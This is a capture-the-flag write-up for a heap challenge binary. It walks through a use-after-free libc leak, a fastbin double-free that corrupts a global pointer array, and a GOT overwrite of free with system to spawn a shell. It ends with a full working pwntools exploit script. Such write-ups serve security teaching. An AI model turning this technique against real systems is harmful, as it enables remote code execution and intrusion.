### _Binary Review_



```makefile
RELRO           STACK CANARY      NX            PIE
Partial RELRO   No canary found   NX enabled    No PIE
```

```makefile

[1]MAKE ZEALOTS
[2]DESTROY ZEALOTS
[3]FIX ZEALOTS
[4]DISPLAY SKILLS
[5]GO HOME

```

We can allocate chunks, free them, edit them and dump their content. There isn't much else to say so let's dive in the assembly for some bug hunting.


### _Reverse Engineering_

The binary was in C++ (the disassembly of C++ isn't the same as C and sometimes can be scary too) for the most part but the bug itself wasn't related to that fact. Instead of messing around with C++'s assembly line-by-line, I spotted the functions that allocate / free chunks and checked for heap-related bugs.

```asm
              [...]
00401621  mov     rsi, qword [rbp-0x80]
00401625  movsxd  rdi, dword [rsi]
00401628  mov     rdi, qword [rdi*8+0x605310]
00401630  mov     qword [rbp-0xa0], rax
00401637  call    free
              [...]
```
This is the meat of the binary. We've got a global array of malloc'd pointers at `0x605310` and and `free` being called on them. However, those pointers aren't being zeroed out by the program, meaning we abuse UAF to leak libc pointers and we can extend this UAF and turn into a double-free bug in order to perform a fastbin attack (will explain it in detail later on, no worries).

Although the binary is overall messy, we can get a pretty accurate idea of what's up with its functionality just with the above lines of assembly. Let's develop a visual image of how the binary actually handles the heap while stepping through my exploit.


### _Exploit Visualization_

```python
alloc(0x80, 'A'*10) # chunk 1
alloc(0x80, 'B'*10) # chunk 2
```

```makefile
0x617c10:   0x0000000000000000  0x0000000000000091 <-- chunk 0
0x617c20:   0x4141414141414141  0x00000000000a4141
0x617c30:   0x0000000000000000  0x0000000000000000
0x617c40:   0x0000000000000000  0x0000000000000000
0x617c50:   0x0000000000000000  0x0000000000000000
0x617c60:   0x0000000000000000  0x0000000000000000
0x617c70:   0x0000000000000000  0x0000000000000000
0x617c80:   0x0000000000000000  0x0000000000000000
0x617c90:   0x0000000000000000  0x0000000000000000
0x617ca0:   0x0000000000000000  0x0000000000000091 <-- chunk 1
0x617cb0:   0x4242424242424242  0x00000000000a4242
0x617cc0:   0x0000000000000000  0x0000000000000000
0x617cd0:   0x0000000000000000  0x0000000000000000
0x617ce0:   0x0000000000000000  0x0000000000000000
0x617cf0:   0x0000000000000000  0x0000000000000000
0x617d00:   0x0000000000000000  0x0000000000000000
0x617d10:   0x0000000000000000  0x0000000000000000
0x617d20:   0x0000000000000000  0x0000000000000000
0x617d30:   0x0000000000000000  0x00000000000202d1 <-- top chunk
```

Looks good so far. So once an allocation takes place, we get to choose the size of the chunk and then we enter a description for it (no overflow).

With just those 2 allocated chunks we can get a libc leak thanks to the UAF bug. We'll free `chunk 0` in order to make that happen. Why not free `chunk 1` you ask? Let's have a look at `free`'s source code and find out ourselves.

```c
static void
_int_free (mstate av, mchunkptr p, int have_lock)

                [...]

/*
   If the chunk borders the current high end of memory,
   consolidate into top
*/

else {
   size += nextsize;
   set_head(p, size | PREV_INUSE);
   av->top = p;
   check_chunk(av, p);
}

                [...]
```

Fortunately `free`'s source code is well documented so just by reading the above code and with a quick assumption test in GDB we can translate this to something intuitive.

```makefile
gef➤  x/40gx 0x0000000000617c20 - 16
0x617c10:   0x0000000000000000  0x0000000000000091 <-- chunk 0
0x617c20:   0x4141414141414141  0x00000000000a4141
0x617c30:   0x0000000000000000  0x0000000000000000
0x617c40:   0x0000000000000000  0x0000000000000000
0x617c50:   0x0000000000000000  0x0000000000000000
0x617c60:   0x0000000000000000  0x0000000000000000
0x617c70:   0x0000000000000000  0x0000000000000000
0x617c80:   0x0000000000000000  0x0000000000000000
0x617c90:   0x0000000000000000  0x0000000000000000
0x617ca0:   0x0000000000000000  0x0000000000020361 <-- new top chunk
0x617cb0:   0x4242424242424242  0x00000000000a4242
0x617cc0:   0x0000000000000000  0x0000000000000000
0x617cd0:   0x0000000000000000  0x0000000000000000
0x617ce0:   0x0000000000000000  0x0000000000000000
0x617cf0:   0x0000000000000000  0x0000000000000000
0x617d00:   0x0000000000000000  0x0000000000000000
0x617d10:   0x0000000000000000  0x0000000000000000
0x617d20:   0x0000000000000000  0x0000000000000000
0x617d30:   0x0000000000000000  0x00000000000202d1
```

As you can see we free'd chunk 1 and since its next chunk was the top chunk / wilderness, they got consolidated into a bigger top chunk to be used for further allocation requests. Note that there are no forward  / backward in that area. Top chunk’s address is taken from the `main_arena` structure in libc’s address space and thus there's no reason to keep track of it via linked lists etc.

Now that we've excluded the de-allocation of the chunk whose bordering chunk is the wilderness, let's move on with our plan.

```python
free(0)
```

```makefile
0x617c10:   0x0000000000000000  0x0000000000000091 <-- chunk 0 [free]
0x617c20:   0x00007ffff7530b78  0x00007ffff7530b78
0x617c30:   0x0000000000000000  0x0000000000000000
0x617c40:   0x0000000000000000  0x0000000000000000
0x617c50:   0x0000000000000000  0x0000000000000000
0x617c60:   0x0000000000000000  0x0000000000000000
0x617c70:   0x0000000000000000  0x0000000000000000
0x617c80:   0x0000000000000000  0x0000000000000000
0x617c90:   0x0000000000000000  0x0000000000000000
0x617ca0:   0x0000000000000090  0x0000000000000090 <-- chunk 1 [in use]
0x617cb0:   0x4242424242424242  0x00000000000a4242
0x617cc0:   0x0000000000000000  0x0000000000000000
0x617cd0:   0x0000000000000000  0x0000000000000000
0x617ce0:   0x0000000000000000  0x0000000000000000
0x617cf0:   0x0000000000000000  0x0000000000000000
0x617d00:   0x0000000000000000  0x0000000000000000
0x617d10:   0x0000000000000000  0x0000000000000000
0x617d20:   0x0000000000000000  0x0000000000000000
0x617d30:   0x0000000000000000  0x00000000000202d1
```
Note how chunk 1's size went from **0x91** to **0x90** to indicate that its previous chunk is **free**. Be careful though, when it comes to chunks of fastbin size, their lsb (least significant bit) remains set for speed purposes.

As you can see chunk 0's area got populated with 2 pointers of same nature and value. They are pointer to libc's main arena structure. Libc keeps track of the free'd chunks by storing their pointers in an array of pointers whose each entry is a linked list of a certain size. The chunks I allocated were purposely of size `0x90`, which indicates that they are of smallbin size (fastbins' max size is `0x80`), which means they will be placed in a circular double-linked list. Have a look at this awesome [image](https://imgur.com/a/UDkUV) by this [article](https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/) to get a feel of what's going on, it's not that complicated.

Moving on, we now have a libc leak which officially marks the success of our first objective, getting the base address of libc.

```python

leak = dump(0)
libc = leak - 0x3c4b78
```
We're one step closer to total pwning. It's time to take advantage of the double-free form of UAF and bring the flag home.


### _Fastbin Attack_

Before I begin explaining the hows and whys of the fastbin attack, I'd like to give a huge shoutout to shellphish who created the [how2heap](https://github.com/shellphish/how2heap) repo which basically documents modern heap exploitation techniques. I highly recommend going through the code examples and figuring out the heap internals by tweaking and debugging.

Let's get started. First we'll bring heap to its original state so we can have a fresh start. Though it's not necessary, I like keeping things clean and simple. Those who were paying close attention can figure out how to do that.

```python
free(1)
```

```makefile
0x617c10:   0x0000000000000000  0x00000000000203f1 <-- new top chunk
0x617c20:   0x00007ffff7530b78  0x00007ffff7530b78
0x617c30:   0x0000000000000000  0x0000000000000000
0x617c40:   0x0000000000000000  0x0000000000000000
0x617c50:   0x0000000000000000  0x0000000000000000
0x617c60:   0x0000000000000000  0x0000000000000000
0x617c70:   0x0000000000000000  0x0000000000000000
0x617c80:   0x0000000000000000  0x0000000000000000
0x617c90:   0x0000000000000000  0x0000000000000000
0x617ca0:   0x0000000000000090  0x0000000000000090
0x617cb0:   0x4242424242424242  0x00000000000a4242
0x617cc0:   0x0000000000000000  0x0000000000000000
0x617cd0:   0x0000000000000000  0x0000000000000000
0x617ce0:   0x0000000000000000  0x0000000000000000
0x617cf0:   0x0000000000000000  0x0000000000000000
0x617d00:   0x0000000000000000  0x0000000000000000
0x617d10:   0x0000000000000000  0x0000000000000000
0x617d20:   0x0000000000000000  0x0000000000000000
0x617d30:   0x0000000000000000  0x00000000000202d1 <-- old top chunk
```

The heap has been "re-initialized" by consolidating the last remaining chunk with the wilderness / top chunk and it's ready for new use, or abuse ;)

Someone could assume that the fastbin attack is related to fastbins. That's indeed the case. We're about to exploit the way `malloc` serves / checks free'd fast chunks to the user. Let's create 2 chunks of fastbin size and one of smallbin size to be used as a border in order to prevent consolidation (don't pay attention on that one).

```python
alloc(0x60, 'C'*10) # chunk 2
alloc(0x60, 'D'*10) # chunk 3
alloc(0x80, 'E'*10) # chunk 4
```

```makefile
0x617c10:   0x0000000000000000  0x0000000000000071 <-- chunk 2
0x617c20:   0x4343434343434343  0x00007ffff70a4343
0x617c30:   0x0000000000000000  0x0000000000000000
0x617c40:   0x0000000000000000  0x0000000000000000
0x617c50:   0x0000000000000000  0x0000000000000000
0x617c60:   0x0000000000000000  0x0000000000000000
0x617c70:   0x0000000000000000  0x0000000000000000
0x617c80:   0x0000000000000000  0x0000000000000071 <-- chunk 3
0x617c90:   0x4444444444444444  0x00000000000a4444
0x617ca0:   0x0000000000000090  0x0000000000000090
0x617cb0:   0x4242424242424242  0x00000000000a4242
0x617cc0:   0x0000000000000000  0x0000000000000000
0x617cd0:   0x0000000000000000  0x0000000000000000
0x617ce0:   0x0000000000000000  0x0000000000000000
0x617cf0:   0x0000000000000000  0x0000000000000091 <-- chunk 4
0x617d00:   0x4545454545454545  0x00000000000a4545
0x617d10:   0x0000000000000000  0x0000000000000000
0x617d20:   0x0000000000000000  0x0000000000000000
0x617d30:   0x0000000000000000  0x00000000000202d1 <-- top chunk
```
Free-ing chunk 2 and chunk 3 (the order doesn't really matter as you'll notice later on) will create the following structure in libc:

```makefile
fastbinsY[] initial state

   0x20      0x30               0x70
+--------++--------+         +--------+
|        ||        |   ...   |        |   ...
|        ||        |         |        |
+--------++--------+         +--------+

```


```python
free(3)
```

```makefile
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x617c80 --> 0x0
(0x80)     fastbin[6]: 0x0
```

```makefile
fastbinsY[] free(3)

   0x20      0x30               0x70
+--------++--------+         +--------+
|        ||        |   ...   |        |   ...
|        ||        |         |        |
+--------++--------+         +--------+
                                  |
                                  |
                                  |
                             +--------+
                             |        |
                             |    3   |
                             +--------+
```


```makefile
0x617c10:   0x0000000000000000  0x0000000000000071 <-- chunk 2 [in use]
0x617c20:   0x4343434343434343  0x00007ffff70a4343
0x617c30:   0x0000000000000000  0x0000000000000000
0x617c40:   0x0000000000000000  0x0000000000000000
0x617c50:   0x0000000000000000  0x0000000000000000
0x617c60:   0x0000000000000000  0x0000000000000000
0x617c70:   0x0000000000000000  0x0000000000000000
0x617c80:   0x0000000000000000  0x0000000000000071 <-- chunk 3 [free]
0x617c90:   0x0000000000000000  0x00000000000a4444
0x617ca0:   0x0000000000000090  0x0000000000000090
0x617cb0:   0x4242424242424242  0x00000000000a4242
0x617cc0:   0x0000000000000000  0x0000000000000000
0x617cd0:   0x0000000000000000  0x0000000000000000
0x617ce0:   0x0000000000000000  0x0000000000000000
0x617cf0:   0x0000000000000000  0x0000000000000091 <-- chunk 4 [in use]
0x617d00:   0x4545454545454545  0x00000000000a4545
0x617d10:   0x0000000000000000  0x0000000000000000
0x617d20:   0x0000000000000000  0x0000000000000000
0x617d30:   0x0000000000000000  0x00000000000202d1 <-- top chunk
```

```python
free(2)
```

```makefile
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x617c10 --> 0x617c80 --> 0x0
(0x80)     fastbin[6]: 0x0

```

```makefile
fastbinsY[] free(2)

   0x20      0x30               0x70
+--------++--------+         +--------+
|        ||        |   ...   |        |   ...
|        ||        |         |        |
+--------++--------+         +--------+
                                  |
                                  |
                                  |
                             +--------+
                             |        |
                             |    2   |
                             +--------+
                                  |
                                  |
                                  |
                             +--------+
                             |        |
                             |    3   |
                             +--------+
```


```makefile
0x617c10:   0x0000000000000000  0x0000000000000071 <-- chunk 2 [free]
0x617c20:   0x0000000000617c80  0x00007ffff70a4343
0x617c30:   0x0000000000000000  0x0000000000000000
0x617c40:   0x0000000000000000  0x0000000000000000
0x617c50:   0x0000000000000000  0x0000000000000000
0x617c60:   0x0000000000000000  0x0000000000000000
0x617c70:   0x0000000000000000  0x0000000000000000
0x617c80:   0x0000000000000000  0x0000000000000071 <-- chunk 3 [free]
0x617c90:   0x0000000000000000  0x00000000000a4444
0x617ca0:   0x0000000000000090  0x0000000000000090
0x617cb0:   0x4242424242424242  0x00000000000a4242
0x617cc0:   0x0000000000000000  0x0000000000000000
0x617cd0:   0x0000000000000000  0x0000000000000000
0x617ce0:   0x0000000000000000  0x0000000000000000
0x617cf0:   0x0000000000000000  0x0000000000000091 <-- chunk 4 [in use]
0x617d00:   0x4545454545454545  0x00000000000a4545
0x617d10:   0x0000000000000000  0x0000000000000000
0x617d20:   0x0000000000000000  0x0000000000000000
0x617d30:   0x0000000000000000  0x00000000000202d1 <-- top chunk

```

To understand the above drawing, just keep in mind the following:

_There are 10 fast bins. Each of these bins maintains a single linked list. Addition and deletion happen from the front of this list (LIFO)._

In our scenario we have 2 free'd chunks. Once we request a chunk of size `0x70`, `malloc` will do the following:

* Delete the **head** fastbin chunk of the list and give it back to the user.

* For the next allocation, place at the **head** of the list the address of the chunk which was found in the previous chunk's forward pointer field of the chunk that was given back to the user (don't worry if it sounds complicated, there'll be more ascii-arts soon).

The 2nd bullet point is the bread and butter of the fastbin attack. What if we were able to overwrite the forward pointer of a fastbin chunk while it's still in its free list with an address of our choice? That essentially means we would get back an arbitrary pointer where we can write whatever we want. Here's our write primitive! But no so easy folks, there are 2 requirements we need to take care of first.

First of all, how can we overwrite the forward pointer if there's no overflow? Well well, we can abuse the UAF in order to `free` a chunk twice in a certain order. What do I mean by the order?

```c
if (__builtin_expect (old == p, 0)) {
    errstr = "double free or corruption (fasttop)";
    goto errout;
}
```
The above code checks if the chunk that is about get free'd is the one that is currently at the top / head of the fastbin list. In other words, we can't `free` the same chunk twice in a row. But that's not secure enough! Bypassing this is a piece of cake. All we have to do is `free` a different chunk in between the double free. Let's reconstruct the exploit and enter visual mode.

```python
# double-free => fastbin attack
free(3)
free(2)
free(3)
```
We had already analyzed the first 2 `free`s so let's continue with the 3rd one.

```python
free(3)
```

```makefile
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x617c80 --> 0x617c10 --> 0x617c80
(0x80)     fastbin[6]: 0x0
```

```makefile
fastbinsY[] free(3)

   0x20      0x30               0x70
+--------++--------+         +--------+
|        ||        |   ...   |        |   ...
|        ||        |         |        |
+--------++--------+         +--------+
                                  |
                                  |
                                  |
                             +--------+
                             |        |
                             |    3   |
                             +--------+
                                  |
                                  |
                                  |
                             +--------+
                             |        |
                             |    2   |
                             +--------+
                                  |
                                  |
                                  |
                             +--------+
                             |        |
                             |    3   |
                             +--------+
```

```makefile
0x617c10:   0x0000000000000000  0x0000000000000071 <-- chunk 2 [free]
0x617c20:   0x0000000000617c80  0x00007ffff70a4343
0x617c30:   0x0000000000000000  0x0000000000000000
0x617c40:   0x0000000000000000  0x0000000000000000
0x617c50:   0x0000000000000000  0x0000000000000000
0x617c60:   0x0000000000000000  0x0000000000000000
0x617c70:   0x0000000000000000  0x0000000000000000
0x617c80:   0x0000000000000000  0x0000000000000071 <-- chunk 3 [free]
0x617c90:   0x0000000000617c10  0x00000000000a4444
0x617ca0:   0x0000000000000090  0x0000000000000090
0x617cb0:   0x4242424242424242  0x00000000000a4242
0x617cc0:   0x0000000000000000  0x0000000000000000
0x617cd0:   0x0000000000000000  0x0000000000000000
0x617ce0:   0x0000000000000000  0x0000000000000000
0x617cf0:   0x0000000000000000  0x0000000000000091 <-- chunk 4 [in use]
0x617d00:   0x4545454545454545  0x00000000000a4545
0x617d10:   0x0000000000000000  0x0000000000000000
0x617d20:   0x0000000000000000  0x0000000000000000
0x617d30:   0x0000000000000000  0x00000000000202d1 <-- top chunk
```

Do you see what I see? We placed the same chunk **twice** in its corresponding free list! Now ask yourselves, what's going to happen once we request a chunk of size `0x70`? You already know it by now, `malloc` will check the **head** of the free list and serve back the chunk. However, because of the way we have constructed the free list thanks to the double-free bug, we get to affect `0x617c80`'s FD pointer while it's free! Let's see it in action.

```python
alloc(0x68, p64(bss))
```

```makefile
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x617c10 --> 0x617c80 --> 0x6052ed
(0x80)     fastbin[6]: 0x0
```

Let me remind you of the structure of a fastbin chunk and then just pause and ponder.

```makefile
Fastbin Chunk Structure

    chunk-> +-------------------------------------------+
            |    Size of previous chunk if it's free    |
            +-------------------------------------------+
            |             Size of chunk                 |
      mem-> +-------------------------------------------+
            |    Forward pointer to next chunk in list  |
            +-------------------------------------------+
            |                   ...                     |
            +-------------------------------------------+
```

In general, whenever we request a chunk, `malloc` will serve back a pointer to where `mem` is pointing to in the ascii-art. Regarding the exploit now, we requested a chunk of size `0x68` (which wraps around `0x70` for alignment purposes) and we effectively got access to `0x617c80` which happens to remain in the free list as well. As it can be seen below, we overwrote the `FD` field with an address of our choice.

```makefile
0x617c80:   0x0000000000000000  0x0000000000000071 <--  chunk 3 [free & in use]
0x617c90:   0x00000000006052ed <-- FD pointer
```

Here's a view of the fastbin list as well:


```makefile
fastbinsY[] alloc(0x68)

   0x20      0x30               0x70
+--------++--------+         +--------+
|        ||        |   ...   |        |   ...
|        ||        |         |        |
+--------++--------+         +--------+
                                  |
                                  |
                                  |
                             +--------+
                             |        |
                             |    2   |
                             +--------+
                                  |
                                  |
                                  |
                             +--------+
                             |        |
                             |    3   |
                             +--------+
                                  |
                                  |
                                  |
                             +--------+
                             |        |
                             |0x6052ed|
                             +--------+
```


The question now is why did we overwrite the `FD` field with `0x6052ed`? We somehow need to get our arbitrary (almost) primitive, don't we?

`malloc` does the following check before it deletes a free fastbin chunk in order to serve it back to the user:

```c
if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))
{
    errstr = "malloc(): memory corruption (fast)";
errout:
    malloc_printerr (check_action, errstr, chunk2mem (victim), av);
    return NULL;
}
```
`malloc` makes sure there hasn't been any sort of fastbin corruption by checking if the size of the chunk which is about to be deleted corresponds to the size of this fastbin request (max `0x80`) . How do we bypass that? There are a few ways to get around it but here's my thought process:

* The binary has partial RELRO, which means the Global Offset Table is still writable.

* If the binary had full RELRO, we can still get around it by overwriting the `__malloc_hook` function pointer in libc (which is the subject of a future post).

* So how we overwrite an entry in GOT? The binary keeps track of the allocated objects in a global array of pointers. If we could somehow overwrite one of those pointers with a GOT address and then call the `edit` function, we can overwrite its content with a function of our taste, such as `system`!

Let's inspect the memory around that global array which is at address `0x605310`.

```makefile
gef➤  x/6gx 0x605310
0x605310:   0x0000000000617c20  0x0000000000617cb0
0x605320:   0x0000000000617c20  0x0000000000617c90
0x605330:   0x0000000000617d00  0x0000000000617c90
```

The entries are looking good. Now what if there's an address **before** the global array's address where at offset `+0x8` there is a value of a legitimate fastbin size. After a bit of trial and error, here's our savior!

```makefile
gef➤  x/40gx 0x6052ed
0x6052ed:   0xfff753162000007f  0x000000000000007f
0x6052fd:   0x0000000000000000  0x0000000000000000
0x60530d:   0x0000617c20000000  0x0000617cb0000000
0x60531d:   0x0000617c20000000  0x0000617c90000000
0x60532d:   0x0000617d00000000  0x0000617c90000000
```

Who would've thought, now we're talking! `0x6052ed` is right below `0x605310`, `0x23` below to be precise, which is enough to overflow the entire array since our allocation was of size `0x70`! And the best part, at offset `+0x8` there is `0x7f`, which is a legitimate fastbin chunk size! You might noticed that the address entries are misaligned, but that doesn't bother us, we will make sure to surgically overflow the entries such that one of them points to a GOT entry! Game over!

Let's keep stepping through the exploit and see the magic happen.

```python
alloc(0x68, "F")
```

```makefile
gef➤ printfastbin
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x617c80 --> 0x6052ed
(0x80)     fastbin[6]: 0x0

```

```makefile
fastbinsY[] alloc(0x68)

   0x20      0x30               0x70
+--------++--------+         +--------+
|        ||        |   ...   |        |   ...
|        ||        |         |        |
+--------++--------+         +--------+
                                  |
                                  |
                                  |
                             +--------+
                             |        |
                             |    3   |
                             +--------+
                                  |
                                  |
                                  |
                             +--------+
                             |        |
                             |0x6052ed|
                             +--------+
```

```python
alloc(0x68, "G")
```

```makefile
gef➤  printfastbin
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x6052ed
(0x80)     fastbin[6]: 0x0
```


```makefile
fastbinsY[] alloc(0x68)

   0x20      0x30               0x70
+--------++--------+         +--------+
|        ||        |   ...   |        |   ...
|        ||        |         |        |
+--------++--------+         +--------+
                                  |
                                  |
                                  |
                             +--------+
                             |        |
                             |0x6052ed|
                             +--------+
```

Off to the last part, on the next allocation we'll get back `0x6052ed` and we'll overflow the 1st and 2nd entry of the global array to point to `free`'s GOT entry and `sh`'s address respectively.

```python
alloc(0x68,"H"*0x13 + p64(free_got) + p64(binsh))
```

```makefile
gef➤  printfastbin
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
```

```makefile
gef➤  x/5gx 0x605310
0x605310:   0x0000000000605060  0x00007ffff72f8d17
0x605320:   0x0000000000617c0a  0x0000000000617c90
0x605330:   0x0000000000617d00

gef➤  x/gx 0x0000000000605060
0x605060:   0x00007ffff71f04f0

gef➤  x 0x00007ffff71f04f0
0x7ffff71f04f0 <__GI___libc_free>:  0x8348535554415541

gef➤  x/s 0x00007ffff72f8d17
0x7ffff72f8d17: "/bin/sh"
```


```makefile
fastbinsY[] alloc(0x68)

   0x20      0x30               0x70
+--------++--------+         +--------+
|        ||        |   ...   |        |   ...
|        ||        |         |        |
+--------++--------+         +--------+

```


Brilliant! Let's pwn this binary once and for all.


### _Pwning Time_

* The `edit` function receives an index as input and then picks the corresponding entry from the global array in order to overwrite its content with our desired input. I picked `free` as the victim GOT entry because it receives one argument, like `system`.

* When we're asked to de-allocate a chunk, we provide an index once again and `free` will be called (or would be called since we'll overwrite it `system`'s address) with an address from the global array as an argument.

* Since we overwrote the 1st entry with `system`'s address and the 2nd one with `sh`'s address, once de-allocation takes place and we provide `1` as the index (arrays are indexed from 0), `system` will take over control and execute whatever command is at the address which was found in the global array. There's our shell!

```python
# free => system
edit(0, 8, p64(system))
```

```makefile
gef➤  x/gx 0x0000000000605060
0x605060:   0x00007ffff71b1390
gef➤  x 0x00007ffff71b1390
0x7ffff71b1390 <__libc_system>: 0xfa86e90b74ff8548
```

Voila! `free`'s GOT entry officially points to `system`'s address! Let's bring this flag home!

```python
# call system with the 2nd entry as argument, which is binsh
free(1)
```

```makefile
[*] Leak:        0x7fa077b3fb78
[*] Libc:        0x7fa07777b000
[*] system:      0x7fa0777c0390
[*] Switching to interactive mode
[*] BREAKING....
$ id
uid=1000(auir) gid=1000(auir) groups=1000(auir)
$ ls
auir
flag
$ cat flag
flag{W4rr10rs!_A1ur_4wa1ts_y0u!_M4rch_f0rth_and_t4k3_1t!}
```
### _Exploit_

```python
from pwn import *

'''
HOST = pwn.chal.csaw.io
PORT = 7713
PoC:  https://asciinema.org/a/IARN4KoGyVYbDai3Je3dXJM95
Flag: flag{W4rr10rs!_A1ur_4wa1ts_y0u!_M4rch_f0rth_and_t4k3_1t!}
'''

free_got = 0x605060
sys_off  = 0x45390
sh_off   = 0x18cd17
# bss pointer to use for the fastbin attack
bss      = 0x6052ed

def alloc(size, data):

    r.sendlineafter('>>', '1')
    r.sendlineafter('>>', str(size))
    r.sendlineafter('>>', data)

    return

def dump(idx):

    r.sendlineafter('>>', '4')
    r.sendlineafter('>>', str(idx))

    r.recvuntil('SHOWING....\n')

    return u64(r.recv(6).ljust(8, '\x00'))

def free(idx):

    r.sendlineafter('>>', '2')
    r.sendlineafter('>>', str(idx))

    return

def edit(idx, size, data):

    r.sendlineafter('>>', '3')
    r.sendlineafter('>>', str(idx))
    r.sendlineafter('>>', str(size))
    r.sendlineafter('>>', data)

    return

def pwn():
    
    # allocate small chunks in order for them to get populated
    # with pointers to libc once they are free'd
    alloc(0x80, 'A'*10) # chunk 1
    alloc(0x80, 'B'*10) # chunk 2

    free(0)
    
    # UAF
    leak        = dump(0)
    libc        = leak - 0x3c4b78
    system      = libc + sys_off
    binsh       = libc + sh_off

    log.info("Leak:        0x{:x}".format(leak))
    log.info("Libc:        0x{:x}".format(libc))
    log.info("system:      0x{:x}".format(system))

    # fresh start - consolidate free chunks
    free(1)

    alloc(0x60, 'C'*10) # chunk 3
    alloc(0x60, 'D'*10) # chunk 4
    alloc(0x80, 'E'*10) # chunk 5

    # double-free bug => fastbin attack
    free(3)
    free(2)
    free(3)

    # make malloc return 0x6052ed so we can overwrite the
    # entries in the global pointer array
    payload = p64(bss)
    alloc(0x68, payload)
    alloc(0x68, "F")
    alloc(0x68, "G")
    # overwrite the 1st entry with free's got entry
    # and the 2nd entry with binsh's address
    alloc(0x68,"H"*0x13 + p64(free_got) + p64(binsh))

    # free => system
    edit(0, 8, p64(system))

    # call system with the 2nd entry as argument, which is binsh
    free(1)

    r.interactive()

if __name__ == "__main__":
    log.info("For remote: {} HOST PORT".format(sys.argv[0]))
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        pwn()
    else:
        r = process('./auir')
        pause()
        pwn()
```

~ Peace!
